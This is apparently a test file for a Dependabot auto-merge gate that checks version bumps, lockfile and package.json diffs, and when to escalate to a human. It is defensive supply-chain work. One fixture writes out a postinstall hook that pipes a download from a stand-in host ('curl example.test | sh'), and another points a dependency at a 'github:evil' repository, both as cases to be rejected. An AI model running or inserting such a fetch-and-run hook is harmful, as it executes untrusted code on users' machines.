import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import type {
  GateInput,
  ImpactAssessment,
} from "../../f/factory/lib/dependabot_support.ts";
import {
  checkLockfileDiff,
  checkPackageJsonDiff,
  classifyUpdate,
  evaluateGate,
  isPublishedLongEnough,
  parseImpactAssessment,
  REQUIRED_CHECKS,
} from "../../f/factory/lib/dependabot_support.ts";

describe("classifyUpdate", () => {
  test("classifies a patch bump", () => {
    expect(classifyUpdate("1.2.3", "1.2.4")).toBe("patch");
  });

  test("classifies a minor bump", () => {
    expect(classifyUpdate("1.2.3", "1.3.0")).toBe("minor");
  });

  test("classifies a major bump", () => {
    expect(classifyUpdate("1.2.3", "2.0.0")).toBe("major");
  });

  test("returns unknown for a value that is not a plain version", () => {
    expect(classifyUpdate("1.2.3", "latest")).toBe("unknown");
  });

  test("returns unknown for a pre-release version", () => {
    expect(classifyUpdate("1.2.3", "1.2.4-beta.1")).toBe("unknown");
  });

  test("returns unknown when the version does not go up", () => {
    expect(classifyUpdate("1.2.3", "1.2.2")).toBe("unknown");
  });

  test("treats a minor bump of a 0.x version as major", () => {
    expect(classifyUpdate("0.4.1", "0.5.0")).toBe("major");
  });

  test("treats a patch bump of a 0.0.x version as major", () => {
    expect(classifyUpdate("0.0.3", "0.0.4")).toBe("major");
  });

  test("keeps a patch bump of a 0.x version as patch", () => {
    expect(classifyUpdate("0.4.1", "0.4.2")).toBe("patch");
  });
});

describe("isPublishedLongEnough", () => {
  const DAY_MS = 24 * 60 * 60 * 1000;
  const publishedAt = "2026-10-01T00:00:00.000Z";
  const publishedMs = Date.parse(publishedAt);

  test("passes exactly at minDays", () => {
    expect(
      isPublishedLongEnough(publishedAt, publishedMs + 7 * DAY_MS, 7),
    ).toBe(true);
  });

  test("fails one millisecond before minDays", () => {
    expect(
      isPublishedLongEnough(publishedAt, publishedMs + 7 * DAY_MS - 1, 7),
    ).toBe(false);
  });

  test("fails for an invalid date", () => {
    expect(
      isPublishedLongEnough("not-a-date", publishedMs + 30 * DAY_MS, 7),
    ).toBe(false);
  });

  test("fails for a date in the future", () => {
    expect(isPublishedLongEnough(publishedAt, publishedMs - DAY_MS, 0)).toBe(
      false,
    );
  });

  test("fails for a date without a time zone", () => {
    expect(
      isPublishedLongEnough(
        "2026-10-01T00:00:00",
        publishedMs + 30 * DAY_MS,
        7,
      ),
    ).toBe(false);
  });

  test("fails for a date without a time", () => {
    expect(
      isPublishedLongEnough("2026-10-01", publishedMs + 30 * DAY_MS, 7),
    ).toBe(false);
  });

  test("accepts a date with a numeric offset", () => {
    expect(
      isPublishedLongEnough(
        "2026-10-01T09:00:00+09:00",
        publishedMs + 7 * DAY_MS,
        7,
      ),
    ).toBe(true);
  });

  test("fails when minDays is negative", () => {
    expect(isPublishedLongEnough(publishedAt, publishedMs + DAY_MS, -1)).toBe(
      false,
    );
  });

  test("fails when minDays is not finite", () => {
    expect(
      isPublishedLongEnough(publishedAt, publishedMs + DAY_MS, Number.NaN),
    ).toBe(false);
  });

  test("fails when minDays is infinite", () => {
    expect(
      isPublishedLongEnough(
        publishedAt,
        publishedMs + DAY_MS,
        Number.POSITIVE_INFINITY,
      ),
    ).toBe(false);
  });
});

type LockEntry = {
  key: string;
  id: string;
  registry?: string;
  dependencies?: string;
  integrity?: string;
};

const INTEGRITY_A =
  "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==";
const INTEGRITY_B =
  "sha512-BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB==";

// bun.lockのテキスト形式(末尾にカンマを許すJSON)の最小例を作る。
function lockText(
  workspaceDeps: Record<string, string>,
  entries: readonly LockEntry[],
): string {
  const deps = Object.entries(workspaceDeps)
    .map(([name, spec]) => `        "${name}": "${spec}",\n`)
    .join("");
  const packages = entries
    .map(
      (e) =>
        `    "${e.key}": ["${e.id}", "${e.registry ?? ""}", {${e.dependencies ?? ""}}, "${e.integrity ?? INTEGRITY_A}"],\n`,
    )
    .join("\n");
  return `{
  "lockfileVersion": 2,
  "configVersion": 1,
  "workspaces": {
    "": {
      "name": "fixture",
      "dependencies": {
${deps}      },
    },
  },
  "packages": {
${packages}  },
}
`;
}

const TARGET = { name: "left-pad", to: "1.3.1" };

const BEFORE = lockText({ "left-pad": "1.3.0", other: "2.0.0" }, [
  { key: "left-pad", id: "left-pad@1.3.0" },
  { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
]);

const AFTER_OK = lockText({ "left-pad": "1.3.1", other: "2.0.0" }, [
  { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
  { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
]);

describe("checkLockfileDiff", () => {
  test("accepts a version bump of the target only", () => {
    expect(checkLockfileDiff(BEFORE, AFTER_OK, TARGET)).toEqual({ ok: true });
  });

  test("accepts a patch bump of a package in the real console/bun.lock", () => {
    const real = readFileSync(
      new URL("../../console/bun.lock", import.meta.url),
      "utf8",
    );
    // 最初に見つかる、major 1以上で固定された依存の patch を1つ上げる。
    const pinned = /^\s+"([^"]+)": "([1-9]\d*)\.(\d+)\.(\d+)",$/m.exec(real);
    if (pinned === null)
      throw new Error("no pinned dependency in the lockfile");
    const [line, name, major, minor, patch] = pinned;
    const from = `${major}.${minor}.${patch}`;
    const to = `${major}.${minor}.${Number(patch) + 1}`;
    const after = real
      .replace(line, line.replace(from, to))
      .replaceAll(`"${name}@${from}"`, `"${name}@${to}"`);

    expect(checkLockfileDiff(real, after, { name: name ?? "", to })).toEqual({
      ok: true,
    });
  });

  test("rejects a nested copy of the target that jumps a major version", () => {
    const before = lockText({ "left-pad": "1.3.0" }, [
      { key: "left-pad", id: "left-pad@1.3.0" },
      { key: "foo/left-pad", id: "left-pad@0.9.0" },
    ]);
    const after = lockText({ "left-pad": "1.3.1" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
      { key: "foo/left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(before, after, TARGET).ok).toBe(false);
  });

  test("accepts a nested copy of the target bumped by a patch", () => {
    const before = lockText({ "left-pad": "1.3.0" }, [
      { key: "left-pad", id: "left-pad@1.3.0" },
      { key: "foo/left-pad", id: "left-pad@1.3.0" },
    ]);
    const after = lockText({ "left-pad": "1.3.1" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
      { key: "foo/left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(before, after, TARGET)).toEqual({ ok: true });
  });

  test("rejects a duplicate key in the packages table", () => {
    // 後ろの値が有効になる重複なので、検出しなければ更新に見える。
    const duplicated = AFTER_OK.replace(
      '    "left-pad": [',
      `    "left-pad": ["left-pad@1.3.0", "", {}, "${INTEGRITY_A}"],\n    "left-pad": [`,
    );

    expect(checkLockfileDiff(BEFORE, duplicated, TARGET).ok).toBe(false);
  });

  test("rejects a package added besides the target", () => {
    const after = lockText({ "left-pad": "1.3.1", other: "2.0.0" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
      { key: "extra", id: "extra@0.0.1" },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a package removed besides the target", () => {
    const after = lockText({ "left-pad": "1.3.1" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a version change of a package other than the target", () => {
    const after = lockText({ "left-pad": "1.3.1", other: "2.0.1" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
      { key: "other", id: "other@2.0.1", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a target bumped to a version other than the expected one", () => {
    const after = lockText({ "left-pad": "1.4.0", other: "2.0.0" }, [
      { key: "left-pad", id: "left-pad@1.4.0", integrity: INTEGRITY_B },
      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a registry URL change", () => {
    const after = lockText({ "left-pad": "1.3.1", other: "2.0.0" }, [
      {
        key: "left-pad",
        id: "left-pad@1.3.1",
        registry: "https://registry.example.test/",
        integrity: INTEGRITY_B,
      },
      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an integrity change without a version change", () => {
    const after = lockText({ "left-pad": "1.3.1", other: "2.0.0" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_A },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a bumped target without sha512 integrity", () => {
    const after = lockText({ "left-pad": "1.3.1", other: "2.0.0" }, [
      { key: "left-pad", id: "left-pad@1.3.1", integrity: "sha1-xxxx" },
      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
    ]);

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a lockfile where the target is not updated", () => {
    expect(checkLockfileDiff(BEFORE, BEFORE, TARGET).ok).toBe(false);
  });

  test("rejects a new workspace dependency", () => {
    const after = lockText(
      { "left-pad": "1.3.1", other: "2.0.0", extra: "1.0.0" },
      [
        { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
        { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
      ],
    );

    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a lockfile that cannot be parsed", () => {
    expect(checkLockfileDiff(BEFORE, "{ not json", TARGET).ok).toBe(false);
  });
});

function manifest(extra: Record<string, unknown> = {}): string {
  return JSON.stringify(
    {
      name: "fixture",
      version: "1.0.0",
      scripts: { test: "bun test" },
      dependencies: { "left-pad": "1.3.0", other: "2.0.0" },
      devDependencies: { tool: "3.0.0" },
      ...extra,
    },
    null,
    2,
  );
}

const MANIFEST_BEFORE = manifest();

describe("checkPackageJsonDiff", () => {
  test("accepts a version bump of the target dependency", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET)).toEqual({
      ok: true,
    });
  });

  test("accepts a caret range for the new version", () => {
    const after = manifest({
      dependencies: { "left-pad": "^1.3.1", other: "2.0.0" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET)).toEqual({
      ok: true,
    });
  });

  test("accepts a bump of the target in devDependencies", () => {
    const before = manifest({
      dependencies: { other: "2.0.0" },
      devDependencies: { "left-pad": "1.3.0" },
    });
    const after = manifest({
      dependencies: { other: "2.0.0" },
      devDependencies: { "left-pad": "1.3.1" },
    });

    expect(checkPackageJsonDiff(before, after, TARGET)).toEqual({ ok: true });
  });

  test("rejects a changed scripts section", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      scripts: { test: "bun test", postinstall: "curl example.test | sh" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an added trustedDependencies section", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      trustedDependencies: ["left-pad"],
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an added overrides section", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      overrides: { other: "9.9.9" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an added resolutions section", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      resolutions: { other: "9.9.9" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an added patchedDependencies section", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      patchedDependencies: { other: "patches/other.patch" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an added bin section", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      bin: { fixture: "./run.js" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a changed version of another dependency", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.1" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects an added dependency", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0", extra: "1.0.0" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a removed dependency", () => {
    const after = manifest({ dependencies: { "left-pad": "1.3.1" } });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a changed top-level field", () => {
    const after = manifest({
      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
      version: "9.9.9",
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a manifest where the target is unchanged", () => {
    expect(
      checkPackageJsonDiff(MANIFEST_BEFORE, MANIFEST_BEFORE, TARGET).ok,
    ).toBe(false);
  });

  test("rejects a specifier that does not point at the expected version", () => {
    const after = manifest({
      dependencies: { "left-pad": "github:evil/left-pad", other: "2.0.0" },
    });

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a duplicate key", () => {
    const duplicated = MANIFEST_BEFORE.replace(
      '"version": "1.0.0"',
      '"version": "1.0.0", "version": "1.0.0"',
    );
    const after = duplicated.replace(
      '"left-pad": "1.3.0"',
      '"left-pad": "1.3.1"',
    );

    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
  });

  test("rejects a manifest that cannot be parsed", () => {
    expect(checkPackageJsonDiff(MANIFEST_BEFORE, "{ nope", TARGET).ok).toBe(
      false,
    );
  });
});

const NOW_MS = Date.parse("2026-10-20T00:00:00.000Z");

function validInput(overrides: Partial<GateInput> = {}): GateInput {
  return {
    authorLogin: "dependabot[bot]",
    authorType: "Bot",
    headRepoFullName: "owner/repo",
    baseRepoFullName: "owner/repo",
    checks: REQUIRED_CHECKS.map((name) => ({ name, conclusion: "success" })),
    requiredChecks: REQUIRED_CHECKS,
    update: "patch",
    changedPaths: ["package.json", "bun.lock"],
    mergeable: true,
    publishedAtIso: "2026-10-01T00:00:00.000Z",
    nowMs: NOW_MS,
    minPublishedDays: 7,
    lockfile: { ok: true },
    allCommitsByDependabot: true,
    packageJson: { ok: true },
    hasNewLifecycleScript: false,
    ...overrides,
  };
}

function verdictOf(overrides: Partial<GateInput>): string {
  const result = evaluateGate(validInput(overrides));
  return result.ok ? "ok" : result.kind;
}

describe("REQUIRED_CHECKS", () => {
  test("lists the checks the main ruleset requires", () => {
    expect([...REQUIRED_CHECKS]).toEqual([
      "scope",
      "check",
      "test-db",
      "metadata",
      "console",
      "caddyfile",
      "console-fetcher-image",
    ]);
  });
});

describe("evaluateGate", () => {
  test("passes when every condition holds", () => {
    expect(evaluateGate(validInput())).toEqual({ ok: true });
  });

  test("accepts a minor update", () => {
    expect(verdictOf({ update: "minor" })).toBe("ok");
  });

  test("accepts the console lockfile and manifest", () => {
    expect(
      verdictOf({ changedPaths: ["console/package.json", "console/bun.lock"] }),
    ).toBe("ok");
  });

  test("treats a skipped required check as passed", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          conclusion: name === "console" ? "skipped" : "success",
        })),
      }),
    ).toBe("ok");
  });

  test("waits while a required check is not completed", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          conclusion: name === "check" ? null : "success",
        })),
      }),
    ).toBe("wait");
  });

  test("waits while a required check has not appeared", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.filter((name) => name !== "metadata").map(
          (name) => ({ name, conclusion: "success" }),
        ),
      }),
    ).toBe("wait");
  });

  test("ignores a check that is not required", () => {
    expect(
      verdictOf({
        checks: [
          ...REQUIRED_CHECKS.map((name) => ({ name, conclusion: "success" })),
          { name: "optional", conclusion: "failure" },
        ],
      }),
    ).toBe("ok");
  });

  test("needs a human when a required check failed", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          conclusion: name === "test-db" ? "failure" : "success",
        })),
      }),
    ).toBe("needs_human");
  });

  test("needs a human when a required check was cancelled", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          conclusion: name === "scope" ? "cancelled" : "success",
        })),
      }),
    ).toBe("needs_human");
  });

  test("needs a human for a failed check even while another is pending", () => {
    expect(
      verdictOf({
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          conclusion:
            name === "scope" ? "failure" : name === "check" ? null : "success",
        })),
      }),
    ).toBe("needs_human");
  });

  test("needs a human for a pull request from a fork", () => {
    expect(verdictOf({ headRepoFullName: "someone/repo" })).toBe("needs_human");
  });

  test("needs a human when the author is not dependabot", () => {
    expect(verdictOf({ authorLogin: "someone" })).toBe("needs_human");
  });

  test("needs a human when the author is not a bot", () => {
    expect(verdictOf({ authorType: "User" })).toBe("needs_human");
  });

  test("needs a human for a major update", () => {
    expect(verdictOf({ update: "major" })).toBe("needs_human");
  });

  test("needs a human for an unknown update", () => {
    expect(verdictOf({ update: "unknown" })).toBe("needs_human");
  });

  test("needs a human when a protected path changed", () => {
    expect(
      verdictOf({ changedPaths: ["package.json", ".github/workflows/ci.yml"] }),
    ).toBe("needs_human");
  });

  test("needs a human when a path outside the allowed set changed", () => {
    expect(
      verdictOf({ changedPaths: ["package.json", "f/factory/lib/db.ts"] }),
    ).toBe("needs_human");
  });

  test("needs a human when a nested manifest changed", () => {
    expect(verdictOf({ changedPaths: ["packages/x/package.json"] })).toBe(
      "needs_human",
    );
  });

  test("needs a human when no path changed", () => {
    expect(verdictOf({ changedPaths: [] })).toBe("needs_human");
  });

  test("needs a human when the pull request is not mergeable", () => {
    expect(verdictOf({ mergeable: false })).toBe("needs_human");
  });

  test("waits while mergeability is not computed", () => {
    expect(verdictOf({ mergeable: null })).toBe("wait");
  });

  test("needs a human for a bad author even when mergeability is not computed", () => {
    expect(verdictOf({ mergeable: null, authorLogin: "someone" })).toBe(
      "needs_human",
    );
  });

  test("needs a human when mergeability is not computed and a required check failed", () => {
    expect(
      verdictOf({
        mergeable: null,
        checks: REQUIRED_CHECKS.map((name) => ({
          name,
          conclusion: name === "check" ? "failure" : "success",
        })),
      }),
    ).toBe("needs_human");
  });

  test("needs a human when the lockfile diff is rejected", () => {
    expect(
      verdictOf({ lockfile: { ok: false, reason: "extra package" } }),
    ).toBe("needs_human");
  });

  test("needs a human when a lifecycle script was added", () => {
    expect(verdictOf({ hasNewLifecycleScript: true })).toBe("needs_human");
  });

  test("needs a human when a commit is not by dependabot", () => {
    expect(verdictOf({ allCommitsByDependabot: false })).toBe("needs_human");
  });

  test("needs a human when the package.json diff is rejected", () => {
    expect(
      verdictOf({ packageJson: { ok: false, reason: "scripts changed" } }),
    ).toBe("needs_human");
  });

  test("needs a human when no check is required", () => {
    expect(verdictOf({ requiredChecks: [], checks: [] })).toBe("needs_human");
  });

  test("needs a human when the minimum days is not finite", () => {
    expect(verdictOf({ minPublishedDays: Number.NaN })).toBe("needs_human");
  });

  test("needs a human when the publish date has no time zone", () => {
    expect(verdictOf({ publishedAtIso: "2026-10-01T00:00:00" })).toBe(
      "needs_human",
    );
  });

  test("needs a human when the publish date is invalid", () => {
    expect(verdictOf({ publishedAtIso: "unknown" })).toBe("needs_human");
  });

  test("waits when the version was published too recently", () => {
    expect(verdictOf({ publishedAtIso: "2026-10-18T00:00:00.000Z" })).toBe(
      "wait",
    );
  });

  test("prefers needs_human over wait", () => {
    expect(
      verdictOf({
        publishedAtIso: "2026-10-18T00:00:00.000Z",
        update: "major",
      }),
    ).toBe("needs_human");
  });

  test("explains why the gate stopped", () => {
    const result = evaluateGate(validInput({ update: "major" }));

    expect(result.ok ? "" : result.reason).toContain("major");
  });
});

describe("parseImpactAssessment", () => {
  const valid: ImpactAssessment = {
    impact: "none",
    evidence: "The package is a dev dependency used only in tests.",
    supplyChainConcerns: [],
    unverified: ["runtime behavior of the new version"],
  };

  test("accepts a well-formed assessment", () => {
    expect(parseImpactAssessment(valid)).toEqual(valid);
  });

  test("drops unknown keys", () => {
    expect(parseImpactAssessment({ ...valid, extra: 1 })).toEqual(valid);
  });

  test("throws when impact is out of range", () => {
    expect(() => parseImpactAssessment({ ...valid, impact: "high" })).toThrow();
  });

  test("throws when supplyChainConcerns is not an array", () => {
    expect(() =>
      parseImpactAssessment({ ...valid, supplyChainConcerns: "none" }),
    ).toThrow();
  });

  test("throws when supplyChainConcerns has a non-string item", () => {
    expect(() =>
      parseImpactAssessment({ ...valid, supplyChainConcerns: [1] }),
    ).toThrow();
  });

  test("throws when unverified is missing", () => {
    expect(() =>
      parseImpactAssessment({
        impact: valid.impact,
        evidence: valid.evidence,
        supplyChainConcerns: valid.supplyChainConcerns,
      }),
    ).toThrow();
  });

  test("throws when evidence is not a string", () => {
    expect(() => parseImpactAssessment({ ...valid, evidence: 3 })).toThrow();
  });

  test("throws when the input is not an object", () => {
    expect(() => parseImpactAssessment("none")).toThrow();
  });
});
